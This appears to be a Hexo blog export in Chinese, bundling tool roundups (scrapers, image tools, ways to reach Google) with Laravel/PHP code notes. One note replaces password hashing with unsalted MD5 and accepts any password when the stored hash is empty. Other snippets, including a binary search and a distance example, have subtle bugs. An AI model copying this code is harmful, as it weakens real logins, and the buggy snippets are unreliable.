https://pan.baidu.com/s/1fYRi8B4irtMqvlgV0Ix5Jg 提取码: cv43网页正文抽取工具https://github.com/chrislinan/cx-extractor-python#ChineseVersion火车采集器http://www.locoy.com/爬虫工具 https://mp.weixin.qq.com/s/_YKN9KN5WenRLYn_qDe6Hghttps://blog.csdn.net/hezheqiang/article/details/79310713介绍一些比较方便好用的爬虫工具和服务 python爬虫工具集合 https://lartpang.github.io/spyder_tool/造数：轻便而强大的爬虫工具 http://growthbox.net/growthhack/631/https://www.zaoshu.io/那我们只能给你推荐另一款懒人专用的工具了：import.io。它的采集功能更丰富，操作更简便，还嵌入了机器学习系统，自动优化采集流程，让你的数据采集更加精准！你甚至可以实时监控亚马逊店铺的产品销量！这个工具的服务器在国外，采集国外的网站更方便。另外，它能够自动切换IP，轻松突破网站的封锁机制，万军之中取上将首级！神箭云import.io链接：https://juejin.im/post/5d5a571151882556ee6dd975Python爬虫Scrapy爬取妹子图网站图片抓取 - 在线Scrapy爬虫生成测试 http://www.toolzl.com/dev/Scrapy/a26bec7f2e7ae4491837451f1283ed4d.html排名前20的网络爬虫工具https://zhuanlan.zhihu.com/p/38832759你都会用八爪鱼了，你可以去试试Octoparse， https://www.octoparse.com/download 八爪鱼6.X稳定版英文化https://webscraper.io/ 微博采集工具箱 https://www.gooseeker.com/land/weibo.html后羿优于爬山虎：后羿不用注册就可以试用，且没有采集、导出限制；爬山虎免费版只能导出为TXT。八爪鱼由于集搜客：虽然集搜客不能批量提取已知网址，但八爪鱼经常提取失败。火车优于其余：火车是老字号了，而且界面也好看一点点。Python爬虫 [http://www.testclass.net/crawler/get_zhihu](http://www.testclass.net/crawler/get_zhihu) 如何成为一名爬虫工程师一个国人编写的强大的网络爬虫系统并带有强大的WebUI。采用Python语言编写，分布式架构，支持多种数据库后端，强大的WebUI支持脚本编辑器，任务监视器，项目管理器以及结果查看器。http://www.pyspider.cn/Spyder简体中文语言包及一键安装脚本 http://www.lizenghai.comhttps://github.com/kingmo888/Spyder_Simplified_Chinese 推荐阅读: 如何发一条空白的朋友圈 那些在国内还能使用的谷歌产品 那些你可能不知道的微信奇技淫巧 如何在豆瓣租房小组快速找到满意的房子 公众号苏生不惑原创文章整理 Chrome 浏览器扩展神器油猴 公众号：苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[那些你可能需要的图片处理工具]]></title>
    <url>%2F2019%2F10%2F22%2F%E9%82%A3%E4%BA%9B%E4%BD%A0%E5%8F%AF%E8%83%BD%E9%9C%80%E8%A6%81%E7%9A%84%E5%9B%BE%E7%89%87%E5%A4%84%E7%90%86%E5%B7%A5%E5%85%B7%2F</url>
    <content type="text"><![CDATA[之前分享过PDF 那些你可能不知道的 PDF 工具 ，这里再分享些好用的图片处理工具。 放大图片使用AI人工智能将图片放大 https://bigjpg.com/ 除了在线版，还提供桌面软件版。这是一个通过神经网络，针对放大图片的线条、颜色、网点等特点，做特殊的算法调整，所以放大效果非常出色, 色彩保留较好, 图片边缘也不会有毛刺和重影,。更重要的是，影响画质的噪点基本在放大的图片上看不出来。 效果图： 在线ps在线版ps https://www.uupoop.com/ 界面类似 photoshop ，不用安装软件在线使用ps。 去除背景https://www.remove.bg/ 一个可以在线抠图的网站，它通过AI识别出人物背景，自动抠图，生成透明选区，可以自己按需求选择适合的背景。效果 它还提供api，可以在命令行执行处理123$ curl -H 'X-API-Key: YOUR_API_KEY' \ -F 'image_file=@/path/to/file.jpg' \ -f https://api.remove.bg/v1.0/removebg -o no-bg.png 有人还开发了Python版的 https://github.com/brilam/remove-bg直接 pip install removebg安装。 图片拼接这是个电影截图拼接工具。http://join-screenshots.zhanghai.me/ http://screenshots.hpday.cn/ 上传2张图 效果 压缩图片有时候图片太大，需要压缩下 ，这个 Google 开发的图片压缩工具squoosh，压缩效果非常好而且不失真，可以从243K压缩到29.3K https://squoosh.app/editor 图床图床就是存图片的地方，国内最好的图床就是微博了，将图片上传到个人相册就能生成一个图片链接了。 而且微博提供4种尺寸（thumbnail，small，bmiddle，large）的图片，比如这条微博https://weibo.com/5890797969/He0iv8K0D?type=comment#_rnd1568371031601 图片比较大，所以直接打开看不清。具体看之前的文章 那些你可能不知道的微博奇技淫巧 默认尺寸宽度是690 https://wx2.sinaimg.cn/mw690/006qFbEtly1fzm2lplxhpj325g0vkkjl.jpg改成large形式就能看清了（在浏览器打开）。https://wx2.sinaimg.cn/large/006qFbEtly1fzm2lplxhpj325g0vkkjl.jpg 如果没有微博或是偶尔存下图片，可以使用一些第三方图床，比如 https://imgchr.com/或者 https://sm.ms/ 图片识别关于ocr之前写过文章那些你可能不知道的 ocr 图片文字识别工具，推荐使用软件天若OCR ，不用安装直接使用， 很轻易识别图片中的文字，公众号回复 ocr获取软件。 去水印Teorex Inpaint是个非常好用的去水印软件 https://www.theinpaint.com/ 打开图片后，选择左侧工具栏的移除区，对要去除水印的对方涂抹，然后点击处理图像即可，公众号回复 去水印 获取软件。 把字幕去掉的效果 截图Snipaste=Snip+paste，即截图 + 贴图，这是一个简单但强大的截图工具，也可以让你将截图贴回到屏幕上！下载并打开 Snipaste，按下 F1 来开始截图，再按 F3，截图就在桌面置顶显示了。就这么简单！还有马赛克，高斯模糊，橡皮擦等功能 ，https://zh.snipaste.com/ 直接到官网下载软件。 类似的还有http://www.fscapture.com 很方便的截长图，滚动截屏，图片编辑，还能录屏等。 ImageMagickImageMagick是一个免费的创建、编辑、合成图片的命令行工具，用来批处理图片放大、缩小、裁剪、旋转、合并、水印、拼接、格式转换等都非常方便，https://www.imagemagick.org/script/download.php12345将jpg转为png格式`convert image.jpg image.png`缩小图片 `convert image.png -resize 100x100 resize.png`裁剪图片 `convert image.png -crop 100x100 crop.png`图片加油画效果`convert -paint 4 image.png image.png`加水印`convert image.png -draw "text 0,20 'test'" image2.png` 梗图素材https://imgflip.com/memetemplates 这个网站收录了几乎外网全部的梗图素材，并且支持在线制作，还可以下载无水印版 。效果： 这篇文章整理测试了好几天，以上工具应该能完美解决你处理图片的需求，如果大家觉得不错帮忙点个在看，感谢。 推荐阅读: 公众号苏生不惑原创文章整理 如何发一条空白的朋友圈 如何在电脑上登陆多个微信 如何提取公积金 9 天到账 免费在线听周杰伦歌曲 那些你可能不知道的微信奇技淫巧 如何在豆瓣租房小组快速找到满意的房子 Chrome 浏览器扩展神器油猴 我的新浪工作日常 公众号：苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2019 年如何优雅的上谷歌]]></title>
    <url>%2F2019%2F10%2F22%2F2019-%E5%B9%B4%E5%A6%82%E4%BD%95%E4%BC%98%E9%9B%85%E7%9A%84%E4%B8%8A%E8%B0%B7%E6%AD%8C%2F</url>
    <content type="text"><![CDATA[国内有百度搜狗bing等搜索引擎，为什么还推荐谷歌呢？平常自己对比下搜索结果就知道，其他就不多说了。 之前我在知识星球上发了个动态（文末点击原文免费加入）。 Google 搜索英文单词发音，比如 pronounce love ,搜索结果提供美式和英式两种发音，还可以调整语速。 还有更多搜索技巧可以看之前的文章 那些你可能不知道的搜索奇技淫巧，有小伙伴想知道怎么上谷歌，于是花点时间整理了下面几个上谷歌的方法，如果有帮助还请大家点个在看支持下。 修改hosts就是通过修改hosts文件来访问谷歌，windows 的hosts文件在C:\WINDOWS\system32\drivers\etc ，其他系统在/etc/hosts添加https://raw.githubusercontent.com/googlehosts/hosts/master/hosts-files/hosts这个文件的内容到hosts文件就行了，如果提示修改没有权限，右键hosts文件属性-安全-选择当前用户名点击编辑，勾选所有权限。 不过这种方法不稳定，有些地区还上不了。 ps：如果在双11把你女朋友电脑的hosts加上127.0.0.1 www.taobao.com ，电脑就没办法上淘宝买买买了，不过小心被分手的后果。。。 谷歌镜像Google镜像就是一个代理访问谷歌的网站，比如 http://ac.scmor.com/ http://gs.yovisun.com/ https://g.zmirrordemo.com/ http://scholar.hedasudi.com/，这些镜像网站可能随时挂，你可以自己搜索下可用的镜像。里面的镜像 4 就能访问Google了,比如这个 http://206.189.135.241/谷歌学术也有对应的镜像 https://xs.glgoo.top/scholar/ Chrome定制版下载地址https://github.com/bannedbook/fanqiang/wiki/Chrome%E4%B8%80%E9%94%AE%E7%BF%BB%E5%A2%99%E5%8C%85 ，这是一个定制版的Chrome浏览器，下载后直接双击一键启动.bat运行，公众号回复 chrome 获取软件。 谷歌访问助手这是一个Chrome扩展，https://github.com/haotian-wang/google-access-helper/releases/download/v2.3.0/google-access-helper-2.3.0.crx，如果下载很慢或者链接挂了，在公众号回复` 谷歌` 获取。 下载扩展后打开Chrome浏览器扩展 chrome://extensions/，打开开发者模式，将下载的crx文件拖进去，如果出错提示程序包无效，将crx后缀改为zip再拖进去就能安装成功了，之前讲过安装Chrome扩展油猴，不知道的话再看看之前的文章 Chrome 浏览器扩展神器油猴，安装完后就能访问谷歌了。 临时方案一个临时上谷歌的网站 https://demo.glyptodon.com/ 你只有十五分钟的使用时间。youtube也可以访问。 到了时间会自动断开，你需要重新连接，所以只能临时用用。 ssr自己搭建 ssr 服务需要一个国外的服务器，网上有很多教程，不过具体操作对普通人还是有点困难，但这种方法好处就是方便在命令行也使用代理。 Git Bash 中用 exportexport http_proxy=10.8.2.2:3128 export https_proxy=10.8.2.2:3128或者直接 export ALL_PROXY=10.8.2.2:3128 ps:10.8.2.2:3128这个ip我随意写的，并不可用。 然后命令行也可以访问谷歌了。 最后总结下： 修改 hosts 不稳定，经常改文件也麻烦，Chrome 定制版，谷歌镜像和临时方案临时用用可以，自己搭建ssr难度大，谷歌访问助手还算稳定，比较推荐这个。 如果以上都挂了，还可以使用这些小众的搜索引擎 那些除百度以外你可能不知道的小众搜索引擎 推荐阅读: 如何发一条空白的朋友圈 那些在国内还能使用的谷歌产品 那些你可能不知道的微信奇技淫巧 如何在豆瓣租房小组快速找到满意的房子 公众号苏生不惑原创文章整理 Chrome 浏览器扩展神器油猴 公众号：苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[laravel 记录]]></title>
    <url>%2F2019%2F10%2F16%2Flaravel-%E8%AE%B0%E5%BD%95%2F</url>
    <content type="text"><![CDATA[Laravel 网站不会被嵌入到其他站点中123456789101112131415161718192021222324252627282930313233343536373839404142434445HTTP 响应头部中，有一个字段，叫做 X-Frame-Options，该字段可以用来指示是否允许自己的网站被嵌入到其他网站的 &lt;iframe&gt; 或者 &lt;object&gt; 标签中。该头部有三个值DENY - 始终不允许嵌入，即使是同一个域名SAMEORIGIN - 只能在相同域名中嵌入ALLOW-FROM uri - 设置允许的域通常，可以在 HTTP 代理中进行配置，比如 nginxadd_header X-Frame-Options SAMEORIGIN;Laravel 自带了用来「只允许同域名嵌入」的中间件，我们只需要在 /app/Http/Kernel.php 中添加即可// /app/Http/Kernel.phpprotected $middleware = [ \Illuminate\Http\Middleware\FrameGuard::class,];该中间件的实现如下&lt;?phpnamespace Illuminate\Http\Middleware;use Closure;class FrameGuard&#123; /** * Handle the given request and get the response. * * @param \Illuminate\Http\Request $request * @param \Closure $next * @return \Symfony\Component\HttpFoundation\Response */ public function handle($request, Closure $next) &#123; $response = $next($request); $response-&gt;headers-&gt;set('X-Frame-Options', 'SAMEORIGIN', false); return $response; &#125;&#125;https://learnku.com/articles/35201https://securityheaders.com/可以直接扫描特定 URL 是否包含一些安全头信息。类似的头还有 X-Content-Type-Options、 Referrer-Policy、Feature-Policy 等。 Uncaught ReflectionException: Class request does not exist12345PHP Fatal error: Uncaught ReflectionException: Class request does not exist in /home/vagrant/learnku/vendor/laravel/framework/src/Illuminate/Container/Container.php:790Stack trace:在 App\Exceptions\Handler::report() 方法里，使用：dd($exception); Laravel 下 TNTSearch+jieba-PHP 实现中文全文搜索123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687TNTSearch+jieba-php 这套组合可以在不依赖第三方的情况下实现中文全文搜索；composer require vanry/laravel-scout-tntsearch'providers' =&gt; [ ... /** * TNTSearch 全文搜索 */ Laravel\Scout\ScoutServiceProvider::class, Vanry\Scout\TNTSearchScoutServiceProvider::class,],composer require fukuball/jieba-phpphp artisan vendor:publish --provider="Laravel\Scout\ScoutServiceProvider"配置项 config/scout.php 中增加 tntsearch'tntsearch' =&gt; [ 'storage' =&gt; storage_path('indexes'), //必须有可写权限 'fuzziness' =&gt; env('TNTSEARCH_FUZZINESS', false), 'searchBoolean' =&gt; env('TNTSEARCH_BOOLEAN', false), 'asYouType' =&gt; false, 'fuzzy' =&gt; [ 'prefix_length' =&gt; 2, 'max_expansions' =&gt; 50, 'distance' =&gt; 2, ], 'tokenizer' =&gt; [ 'driver' =&gt; env('TNTSEARCH_TOKENIZER', 'default'), 'jieba' =&gt; [ 'dict' =&gt; 'small', //'user_dict' =&gt; resource_path('dicts/mydict.txt'), //自定义词典路径 ], 'analysis' =&gt; [ 'result_type' =&gt; 2, 'unit_word' =&gt; true, 'differ_max' =&gt; true, ], 'scws' =&gt; [ 'charset' =&gt; 'utf-8', 'dict' =&gt; '/usr/local/scws/etc/dict.utf8.xdb', 'rule' =&gt; '/usr/local/scws/etc/rules.utf8.ini', 'multi' =&gt; 1, 'ignore' =&gt; true, 'duality' =&gt; false, ], ], 'stopwords' =&gt; [ '的', '了', '而是', ],], env 增加配置项SCOUT_DRIVER=tntsearchTNTSEARCH_TOKENIZER=jiebanamespace App\Models;use Illuminate\Database\Eloquent\Model;use Laravel\Scout\Searchable;class Article extends Model&#123; use Searchable; /** * 索引的字段 * * @return array */ public function toSearchableArray() &#123; return $this-&gt;only('id', 'title', 'content'); // return $this-&gt;toArray(); &#125;&#125;生成索引：php artisan scout:import "App\Model\Article"https://learnku.com/articles/27617#replies 二分查找12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455原理实现：有序集合从中间分为前后2部分，当要查当数值等于中间值，直接返回；当要查询数值大于中间值，则说明要查询的数值在后半部分，那么继续二分后半部分；当要查询数值小于中间数值时，说明要查询的数值在前半部分，那么继续二分前半部分。（过滤掉一半数据查询）&lt;?php /** * 递归实现 * array $arr 有序数组 * int $search 要查询的数字 * int firstIndex 数组起始位置 * int lastIndex 数组结束位置 * @return */ function binarySearchRecursion(array $arr, $search, $lastIndex, $firstIndex = 0) &#123; $len = count($arr); if ($len &lt;= 0) &#123; return -1; &#125; $middle = intval(($firstIndex + $lastIndex) / 2); if ($search == $arr[$middle]) &#123;//找到直接返回 return $arr[$middle]; &#125; elseif ($search &gt; $arr[$middle]) &#123;//去后面查，数组起始位置变为$middle + 1。 return binarySearchRecursion($arr, $search, $middle + 1, $lastIndex); &#125; else &#123;//去前面查，数组结束位置为$middle - 1。 return binarySearchRecursion($arr, $search, $firstIndex, $middle - 1); &#125; return -1; &#125; /** * 递归实现 * array $arr 有序数组 * int $search 要查询的数字 * @return */ function binarySearch($arr, $search) &#123; $len = count($arr); if ($len &lt;= 0 ) &#123; return -1; &#125; $firstIndex = 0; $lastIndex = $len - 1; while($firstIndex &lt;= $lastIndex) &#123; $middle = intval(($firstIndex + $lastIndex) / 2); if ($search == $arr[$middle]) &#123;//出口 return $arr[$middle]; &#125; elseif ($search &gt; $arr[$middle]) &#123;//去后面查，数组起始位置变为$middle + 1。 $firstIndex = $middle + 1; &#125; else &#123;//去前面查，数组结束位置为$middle - 1。 $lastIndex = $middle - 1; &#125; &#125; return -1; &#125; https://learnku.com/articles/35240 子孙树1234567891011121314151617181920$arr = [ ['id'=&gt;1,'parent_id'=&gt;0,'type'=&gt;5], ['id'=&gt;2,'parent_id'=&gt;1,'type'=&gt;3], ['id'=&gt;3,'parent_id'=&gt;0,'type'=&gt;1], ['id'=&gt;4,'parent_id'=&gt;3,'type'=&gt;3],];var_dump(getSubTree($arr));function getSubTree($data, $parent = 'parent_id', $son = 'id', $pid = 0) &#123; $tmp = []; foreach ($data as $key =&gt; $value) &#123; if ($value[$parent] == $pid) &#123; $value['child'] = getSubTree($data, $parent, $son, $value[$son]); $tmp[] = $value; &#125; &#125; return $tmp; &#125; http://www.putyy.com/article/42 Laravel 的设计哲学123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134class UserController extends Controller&#123; public function index() &#123; $users = User::all(); return view('users.index', compact('users')); &#125;&#125;改为 &lt;?php namespace App\Repositories; use App\User; class DbUserRepository &#123; public function all(): array &#123; return User::all()-&gt;toArray(); &#125; &#125; class UserController extends Controller &#123; private $users; public function __construct( ) &#123; $this-&gt;users = new DbUserRepository; // $this-&gt;users = new RedisRepository; &#125; public function index() &#123; $users = $this-&gt;users-&gt;all(); return $users; &#125; &#125; 依赖正转的不合理之处在哪里呢？位于高层的控制器依赖于具体的底层数据获取服务，当底层发生变动时，就需要对应的修改高层的内部结构。 我们对依赖关系进一步分析，可知控制器关注的并不是具体如何获取数据，控制器关注的是「数据的可获取性」这一抽象。因此，我们应当将依赖关系进行反转，将对依赖的具体声明职责转移到外部，让控制器仅依赖于抽象层（数据的可获取性）。这种解决方式称之为 控制反转 或 依赖倒置。通过控制反转，高层不再依赖于具体的底层，仅仅是依赖于抽象层，高层和底层实现了解耦。 用接口来表示「数据的可获取性」这一抽象 &lt;?php namespace App\Repositories; interface UserRepositoryInterface &#123; public function all(): array; &#125; UserController 依赖的是「数据的可获取性」，不依赖于具体的实现 class UserController extends Controller &#123; private $users; public function __construct(UserRepositoryInterface $users) &#123; $this-&gt;users = $users; &#125; &#125; 具体的实现交给对应的仓库类即可 class DbUserRepository implements UserRepositoryInterface &#123;&#125; class RedisRepository implements UserRepositoryInterface &#123; &#125; 根据自己的需要注入对应的服务，这样就实现了依赖注入。 $userRepository = new DbUserRepository; $userController = new UserController($userRepository) 总的来说，依赖注入由四部分构成 被使用的服务 - DbUserRepository 或者 RedisRepository 等 依赖某种服务的客户端 - UserController 声明客户端如何依赖服务的接口 - UserRepositoryInterface 依赖注入器，用于决定注入哪项服务给客户端 一个简单的服务容器的实现 namespace App\Services; use Exception; class Container &#123; protected static $container = []; /** * 绑定服务 * * @param 服务名称 $name * @param Callable $resolver * @return void */ public static function bind($name, Callable $resolver) &#123; static::$container[$name] = $resolver; &#125; /** * 解析服务 * * @param 服务名称 $name * @return mix */ public static function make($name) &#123; if(isset(static::$container[$name]))&#123; $resolver = static::$container[$name]; return $resolver(); &#125; throw new Exception("不存在该绑定"); &#125; &#125; 绑定服务 App\Services\Container::bind('UserRepository', function()&#123; return new App\Repositories\DbUserRepository; &#125;); 解析服务 $userRepository = App\Services\Container::make('UserRepository'); $userController = new UserController($userRepository) Laravel 的服务容器的功能则更加的强大，比如，可以将接口与具体的实现进行绑定，通常在 服务提供者 中使用服务容器来进行绑定 public function register() &#123; $this-&gt;app-&gt;singleton(UserRepositoryInterface::class, function ($app) &#123; return new UserRepository; &#125;); &#125; 高并发业务场景下的秒杀解决方案123456789101112131415161718192021222324252627282930313233343536373839404142434445464748在秒杀前将商品的库存信息加入到 Redis 缓存中。如下格式:$redis-&gt;lpush('商品id',1);/** * * 1.接受用户请求 * 2.验证用户是否已经参与秒杀,商品是否存在 * 3.根据商品id减少商品队列中的库存数量 * 4.将用户的秒杀数据写入server层中,并返回秒杀数据对应的唯一key值 * 5.用户点击下单,根据serve层中的缓存数据,生成订单数据并减少数据库商品的库存数据 */$getParams = $_POST;$userId = $getParams['userId'];$goodsId = $getParams['goodsId'];$key = 'goods:miaosha:';$userResult = $redis-&gt;get($key.$userId);if($userResult)&#123; $userResult = json_decode($userResult,true); echo json_encode(['result'=&gt;$userResult['result'],'key'=&gt;$key.$userId]);// 已经参与过秒杀了 die();&#125;else&#123; $goodqueue = 'goods:queue:'.$goodsId; $result = $redis-&gt;lpop($goodqueue);// 删除商品redis队列缓存 if($result)&#123; $data = json_encode(['result'=&gt;'OK','userId'=&gt;$userId,'goodsId'=&gt;$goodsId]); $redis-&gt;set($key.$userId,$data);// 将秒杀信息写入缓存中 echo json_encode(['result'=&gt;'OK','userId'=&gt;$userId,'goodsId'=&gt;$goodsId,'key'=&gt;$key.$userId]); die(); &#125;else&#123; echo json_encode(['result'=&gt;'FAIL','message'=&gt;'商品不存在','goodsId'=&gt;$goodsId]);// 商品库存不存在 die(); &#125;&#125;/** * 用户下单界面 */ require_once __DIR__.'/redis_connect.php'; $key = $_GET['key']; $data = $redis-&gt;get($key); /** * 生成订单，订单入库 * */https://learnku.com/articles/35141redis list 可以批量插入数据，不一定每次都只插入一个值.$numberArr = range(1,100); //var_dump($numberArr);$redis-&gt;lPush('goods:queue:5',...$numberArr); // 可变参数 PHP 开启 Opcache 后如何优雅地部署 PHP 代码12345提交了代码并且部署了以后，线上代码依然是旧的。所以我执行了下/etc/init.d/php-fpm reload 就生效了。opcache_reset (); 但是注意了 这个函数是强制清楚所有 cache 所以 如果并发较高的系统 不能直接这么搞 还有就是 它有两个清除模式，cli 下只能清除 cli 的 cache fpm 的话 必须通过 fpm 请求方式清除才行https://github.com/gordalina/cachetoolhttps://learnku.com/laravel/t/35142 模型::query () 无数据12345678910111213141516public function getPost()&#123; return Post::query()&#125;public function index()&#123; $post = $this-&gt;getPost(); return view('index', [ 'post' =&gt; $post ]);&#125;@foreach($post-&gt;where('category_id',2)-&gt;get() as xxx)&#123;...&#125;@foreach($post-&gt;where('category_id',3)-&gt;get() as xxx)&#123;...&#125;改(clone $post)-&gt;where(xxxxxxxxx)https://learnku.com/laravel/t/35341 JSON_encode 小数位丢失12345678910111213141516$a = '&#123;"orderAmt":500.00&#125;';$a_json_decode = json_decode($a,true);[ "orderAmt" =&gt; 500.0, ] $a_json_encode = json_encode($a_json_decode);"&#123;"orderAmt":500&#125;"使用字符串类型的 500.00，或使用字符串拼接 JSON json_encode($a_json_decode, JSON_PRESERVE_ZERO_FRACTION)=&gt; "&#123;"orderAmt":500.0&#125;"https://learnku.com/laravel/t/35311 从 PHP 5.6.6+ 开始，json_encode 支持使用 JSON_PRESERVE_ZERO_FRACTION 选项以告知引擎确保浮点数始终编码为浮点数，但对于形如 500.00 （值为 500，精确到小数点后两位的浮点数）仅能保证最终输出 500.0 即使临时配置 serialize_precision 为 10，在初始化数组时使用 number_format 函数格式化小数位数，最后在 json_encode 时填入选项 JSON_PRESERVE_ZERO_FRACTION | JSON_NUMERIC_CHECK 也仅能输出 500.0。 支付宝公钥证书 PHP 版本 SDK12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364function getRootCertSN($str) &#123; // return '687b59193f3f462dd5336e5abf83c5d8_02941eef3187dddf3d3b83462e1dfcf6'; $arr = preg_split('/(?=-----BEGIN)/', $str, -1, PREG_SPLIT_NO_EMPTY); $str = null; foreach ($arr as $e) &#123; $sn = getCertSN($e, true); if (!$sn) &#123; continue; &#125; if ($str === null) &#123; $str = $sn; &#125; else &#123; $str .= "_" . $sn; &#125; &#125; return $str; &#125; function getCertSN($str, $matchAlgo = false) &#123; /* 根据java SDK源码：AntCertificationUtil::getRootCertSN 对证书链中RSA的项目进行过滤（猜测是gm国密算法java抛错搞不定，故意略去） java源码为： if(c.getSigAlgOID().startsWith("1.2.840.113549.1.1")) 根据 https://www.alvestrand.no/objectid/1.2.840.113549.1.1.html 该OID为RSA算法系。 */ if ($matchAlgo) &#123; openssl_x509_export($str, $out, false); if (!preg_match('/Signature Algorithm:.*?RSA/im', $out, $m)) &#123; return; &#125; &#125; $a = openssl_x509_parse($str); $issuer = null; // 注意：根据java代码输出，需要倒着排列 CN,OU,O foreach ($a["issuer"] as $k =&gt; $v) &#123; if ($issuer === null) &#123; $issuer = "$k=$v"; &#125; else &#123; $issuer = "$k=$v," . $issuer; &#125; &#125; # echo($issuer . $a["serialNumber"] . "\n"); $serialNumberHex = decimalNotation($a['serialNumberHex']); $sn = md5($issuer . $serialNumberHex); return $sn; &#125; function decimalNotation($hex) &#123; $dec = 0; $len = strlen($hex); for ($i = 1; $i &lt;= $len; $i++) &#123; $dec = bcadd($dec, bcmul(strval(hexdec($hex[$i - 1])), bcpow('16', strval($len - $i)))); &#125; return $dec; &#125;https://learnku.com/articles/35315 字符串表达式计算123456789$a = 10;var_dump(eval('return $a &gt; 5;'));// 输出:// bool(true)system('php -r "echo 1 + 2;"');echo exec('php -r "echo 1 + 2;"');https://shockerli.net/post/php-expression-string/ 用户登录密码改为 md5123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111新建一个文件 Libraries，在 Libraries 目录下新建一个 MD5.php 文件namespace App\Libraries; use Illuminate\Contracts\Hashing\Hasher; class MD5 implements Hasher &#123; /** * Hash the given value. * * @param string $value * * @return array $options * @return string */ public function make($value, array $options = []) &#123; return md5($value); &#125; /** * Check the given plain value against a hash. * * @param string $value * @param string $hashedValue * @param array $options * * @return bool */ public function check($value, $hashedValue, array $options = []) &#123; if(empty($hashedValue))&#123; return true; &#125; return $this-&gt;make($value) === $hashedValue; &#125; /** * Check if the given hash has been hashed using the given options. * * @param string $hashedValue * @param array $options * * @return bool */ public function needsRehash($hashedValue, array $options = []) &#123; return false; &#125; &#125; Providers 文件下面新建一个文件 MD5ServiceProvider.php namespace App\Providers; use Illuminate\Auth\EloquentUserProvider; class MD5ServiceProvider extends EloquentUserProvider &#123; //继承EloquentUserProvider类，调用父类的构造函数 public function __construct($hasher, $model) &#123; parent::__construct($hasher, $model); &#125; /** * Bootstrap the application services. * * @return void */ public function boot() &#123; // &#125; /** * Register the application services. * * @return void */ public function register() &#123; // &#125; &#125; AuthServiceProvider.php 文件里 boot 方法里添加如下代码 Auth::provider('MD5', function ($app) &#123; $model = config('auth.providers.users.model'); return new MD5ServiceProvider(new MD5, $model); &#125;); 修改 config/auth.php 里的 providers'providers' =&gt; [ 'users' =&gt; [ 'driver' =&gt; 'MD5',//'driver' =&gt; 'eloquent',//eloquent默认加密码方式 'model' =&gt; App\User::class, ], 'admins' =&gt; [ 'driver' =&gt; 'eloquent', 'model' =&gt; App\Admin::class, ], 修改 app/Http/Controllers/Auth/RegisterController.php 里的 create，修改代码如下 protected function create(array $data) &#123; return User::create([ 'name' =&gt; $data['name'], 'email' =&gt; $data['email'], 'password' =&gt; md5($data['password']), ]); &#125; https://learnku.com/articles/35407 Laravel跨库跨连接的事务操作1234567891011121314151617181920212223Laravel 下的跨库事务操作是基于连接的 当执行 DB::beginTransaction(); 的时候 其实是和默认的数据库配置建立了连接 后面的操作 commit 或者 rollback 都是操作的这个默认数据库 如果在这中间操作了其他的数据库 对他是不生效的同时 commit 和 rollback 都 指定连接try &#123; //开启默认数据库的事务 DB::beginTransaction(); //开启test数据库的事务 DB::connection('test')-&gt;beginTransaction(); //中间各种数据库操作 Table1::xxxxxx(); Table2::xxxxxx(); if (true) &#123; //一起提交 DB::commit(); DB::connection('test')-&gt;commit(); &#125; else &#123; //一起回滚 DB::rollback(); DB::connection('test')-&gt;rollback(); &#125;&#125; catch (\Exception $exception) &#123; echo "catch some errors:".$exception-&gt;getMessage();&#125;https://caihongtengxu.github.io/2018/20181009/index.html array_splice无法自定义键值12345678910111213141516171819202122function array_insert (&amp;$array, $position, $insert_array) &#123; $first_array = array_splice ($array, 0, $position); $array = array_merge ($first_array, $insert_array, $array); &#125; $arr = array( 'tt' =&gt; 1333, 'cc' =&gt; 333, 'aaz' =&gt; 2333, 'ee' =&gt; 78, ); $temp["bb"] = 33; array_insert($arr,1,$temp);&gt;&gt;&gt; $arr=&gt; [ "tt" =&gt; 1333, "bb" =&gt; 33, "cc" =&gt; 333, "aaz" =&gt; 2333, "ee" =&gt; 78, ] 数字转度量1234567891011121314151617181920212223242526272829303132/** * 数字转度量 * * @param int $num 数字 * @return string|int */function num2metric($num, $precision = 0) &#123; $unitList = [ 'P' =&gt; 15, 'T' =&gt; 12, 'G' =&gt; 9, 'M' =&gt; 6, 'W' =&gt; 4, 'K' =&gt; 3, ]; $num = (int) $num; foreach($unitList as $name =&gt; $pow) &#123; $size = pow(10, $pow); if($num &gt;= $size) &#123; return round($num / $size * 100, $precision) / 100 . $name; &#125; &#125; return $num;&#125;https://www.hongfs.cn/2018/10/php/php-metric-prefix/num2metric(1000) // 1Knum2metric('10000') // 1Wnum2metric('A') // 0 获取两个坐标之间距离12345678910111213141516171819202122232425262728293031323334/** * 获取两个坐标之间距离 * * @param int|float $lat1 第一个坐标纬度 * @param int|float $lon1 第一个坐标经度 * @param int|float $lat2 第一个坐标纬度 * @param int|float $lon2 第二个坐标经度 * @param string $unit 距离单位 M 法定英里 K 公里 N 海里 * @return int|float */function getDistanceBetweenPoints($lat1, $lon1, $lat2, $lon2, $unit = 'K') &#123; if (($lat1 == $lat2) &amp;&amp; ($lon1 == $lon2)) &#123; return 0; &#125; $theta = $lon1 - $lon2; $dist = sin(deg2rad($lat1)) * sin(deg2rad($lat2)) + cos(deg2rad($lat1)) * cos(deg2rad($lat2)) * cos(deg2rad($theta)); $dist = acos($dist); $dist = rad2deg($dist); $miles = $dist * 60 * 1.1515; $unit = strtoupper($unit); if ($unit === 'K') &#123; return $miles * 1.609344; &#125; else if ($unit === 'N') &#123; return $miles * 0.8684; &#125; else &#123; return $miles; &#125;&#125;https://www.hongfs.cn/2019/06/php/php-get-distance-between-points/getDistanceBetweenPoints(113.276885, 23.090654, 113.320331, 23.096197);// PHP: 4.8368890520256 公里// 高德地图: 4491 米//restapi.amap.com/v3/distance？key-您的key&amp;origins=113.276885，23.090654&amp;destination=113.320331，23.096197&amp;type=e Laravel 上传图片12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455/** * 